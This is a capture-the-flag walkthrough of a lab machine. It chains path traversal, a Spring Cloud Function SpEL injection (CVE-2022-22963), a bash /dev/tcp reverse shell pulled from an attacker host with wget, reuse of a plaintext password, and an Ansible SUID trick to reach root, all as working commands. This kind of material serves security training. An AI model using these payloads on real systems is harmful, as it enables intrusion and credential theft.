<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.129.177.250 -p- -T4 -v

```
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 00:25 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Initiating Ping Scan at 00:25
Scanning 10.129.178.127 [2 ports]
Completed Ping Scan at 00:25, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:25
Completed Parallel DNS resolution of 1 host. at 00:25, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:25
Scanning 10.129.178.127 [2 ports]
Discovered open port 8080/tcp on 10.129.178.127
Discovered open port 22/tcp on 10.129.178.127
Completed Connect Scan at 00:25, 0.19s elapsed (2 total ports)
Initiating Service scan at 00:25
Scanning 2 services on 10.129.178.127
Completed Service scan at 00:25, 7.24s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.178.127.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 6.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.73s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Nmap scan report for 10.129.178.127
Host is up, received conn-refused (0.15s latency).
Scanned at 2023-03-12 00:25:10 WAT for 15s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUJSpBOORoHb6HHQkePUztvh85c2F5k5zMDp+hjFhD8VRC2uKJni1FLYkxVPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds
```
From our scan we have 2 opened ports, port 22 which runs ssh and port 8080 which runs nagios-nsca. Our enumeration today will be focused on port 8080.



<h2>Enumeration</h2>

Going to the webpage should give you this

![image](https://user-images.githubusercontent.com/67879936/224516432-f01c444f-ae09-4135-8454-550989326662.png)

Lets go ahead and fuzz for hidden directories

>command: ffuf -u "http://10.129.178.127:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://10.129.178.127:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.178.127:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 511ms]
blogs                   [Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 260ms]
environment             [Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 384ms]
error                   [Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 153ms]
register                [Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 685ms]
upload                  [Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 186ms]
:: Progress: [32298/32298] :: Job [1/1] :: 231 req/sec :: Duration: [0:03:05] :: Errors: 0 ::
```
Lets go to the _**/upload**_ directory

![image](https://user-images.githubusercontent.com/67879936/224517290-b02c8e4f-1da7-4a4a-ae03-f42e9ecadad2.png)

Lets try to upload an image file

![image](https://user-images.githubusercontent.com/67879936/224517311-ee677fda-6d33-416f-b905-732858adc603.png)

Now les click on the "view your imaage", you should have this

![image](https://user-images.githubusercontent.com/67879936/224517346-9755de93-5714-443f-8d1d-9309b3ed2ee0.png)

Observer the url there, lets try path transversal here

Link:http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd

We'll be using curl to run this

>command: curl -s http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ curl -s http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd             
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```
cool, we can read the ```/etc/passwd``` file. I went ahead to check the ```/var/www``` directory and found the directory ```WebApp```

![image](https://user-images.githubusercontent.com/67879936/224529352-e7f6af30-15fb-415c-ac9a-9fa21f186cba.png)

Checking the contents of this directory I found a ```pom.xml``` file which contains a vulnerable dependency for the springframework

>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../var/www/WebApp/pom.xml

![image](https://user-images.githubusercontent.com/67879936/224529421-593d88e8-6c4c-437e-962c-3c449907a24b.png)
![image](https://user-images.githubusercontent.com/67879936/224529460-c9b842fe-37bf-4475-9820-a1b851d797cc.png)

```spring-cloud-function-web 3.2.2```, I went online to look for available exploits and found this

Link: https://github.com/me2nuk/CVE-2022-22963

Lets go ahead and exploit this



<h2>Exploitation</h2>

command: ```curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v ```

This is meant to create a file named ```pwned``` in the ```/tmp``` directory

![image](https://user-images.githubusercontent.com/67879936/224529802-cbac7868-d0c5-42ef-8de7-cfb1d9758ab4.png)

Now, lets go ahead and check if the file is already in our ```/tmp``` directory

>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../tmp

![image](https://user-images.githubusercontent.com/67879936/224529948-ca73cf8a-ca95-4820-a952-78cf69def285.png)

cool, this means our exploit worked

Now, lets go ahead and upload our reverse shell to the ```/tmp``` directory. We'll be using a bash script

```
#!/bin/bash

bash -i >& /dev/tcp/192.168.49.64/1234 0>&1
```
Save that to a .sh file, and ensure you change the $IP and $port_number

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Documents/short notes]
└─$ nano bash.sh
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Documents/short notes]
└─$ cat bash.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.62/1234 0>&1
```
Now, lets upload

>command: curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.15.62/bash.sh -O /tmp/bash.sh")' --data-raw 'data' -v

Ensure you host the .sh file from your machine

>command: python3 -m http.server

![image](https://user-images.githubusercontent.com/67879936/224531207-c1155af5-656b-4bb8-a50b-6f50412b387e.png)

cool, now lets run the command

![image](https://user-images.githubusercontent.com/67879936/224531216-31b561ca-ea54-40ab-862a-c7629ad9b924.png)

checking the ```/tmp``` directory

>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../tmp

![image](https://user-images.githubusercontent.com/67879936/224531254-31d89cb6-1104-48f2-ae7c-fd5cab3df089.png)

cool hehe, to run this we'll be using the ```bash``` command

>command: curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/bash.sh")' --data-raw 'data' -v

Ensure you have your netcat listener running before running the above command

>command: rlwrap nc -nvlp 1234

![image](https://user-images.githubusercontent.com/67879936/224531384-a054d9c6-0152-46b7-8a29-c5e59b0e2b6b.png)

on our netcat listener;

![image](https://user-images.githubusercontent.com/67879936/224531429-32fc69b9-0b3d-457f-ab69-3803f27d61b3.png)

cool, we got a user shell as Frank. Lets go ahead and escalate our privileges.



<h2>Privilege Escalation</h2>

Checking the ```/home/frank/.m2``` directory, I found a ```settings.xml``` file which contains user ```phil``` creds

![image](https://user-images.githubusercontent.com/67879936/224532242-f11aa518-104a-4253-a4e8-3579d1327d6f.png)

Now, lets go ahead and switch user

```username:phil```             ```password:DocPhillovestoInject123```

![image](https://user-images.githubusercontent.com/67879936/224532273-3277c2fe-f01a-490a-b084-687a162ac122.png)

nice, lets further escalate our privileges

Running Linpeas on the target's machine I found this

![image](https://user-images.githubusercontent.com/67879936/224532432-f5e39701-7f60-40ee-b0d1-0215dc29ff2c.png)

![image](https://user-images.githubusercontent.com/67879936/224532488-4c195364-67ba-4296-a0ab-245e3e8c059d.png)

><font color="Green">This is an Ansible playbook that has a single task called "Checking webapp service". The task uses the `systemd` module provided by Ansible to manage the state of the `webapp` service.

The `systemd` module takes three parameters:

-   `name`: The name of the service to manage. In this case, it's `webapp`.
-   `enabled`: Whether the service should be enabled or not. Here, it's set to `yes`.
-   `state`: The desired state of the service. In this case, it should be `started`.

So this playbook is checking whether the `webapp` service is enabled and started on the `localhost`. If it's not enabled or not started, the playbook will enable and start it.</font>

This file is actuallly owned by root, so we don't have write access

![image](https://user-images.githubusercontent.com/67879936/224532681-910ad8a6-b6fa-4cf2-bb6d-330edfb6acaa.png)

Reading this article https://www.digitalocean.com/community/tutorials/understanding-privilege-escalation-in-ansible-playbooks, I found out that we could create our own playbook. Lets go ahead and do that, we'll be using something simple

This is my playbook

```
- hosts: all
  tasks:
    - name: SUID
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
```

![image](https://user-images.githubusercontent.com/67879936/224533428-e0f966ae-ad49-4a10-b1cb-7a3153a5d8a1.png)

![image](https://user-images.githubusercontent.com/67879936/224602215-31e22b24-5f02-4d9c-8010-90a5813f8a1a.png)

To get root shell, 

>command: /bin/bash -p

![image](https://user-images.githubusercontent.com/67879936/224602318-eedcabf5-1b71-4e37-8c22-bd2fdaca6899.png)

Boom!!! We got a root shell.

That will be all for today
<br> <br>
[Back To Home](../../index.md)




































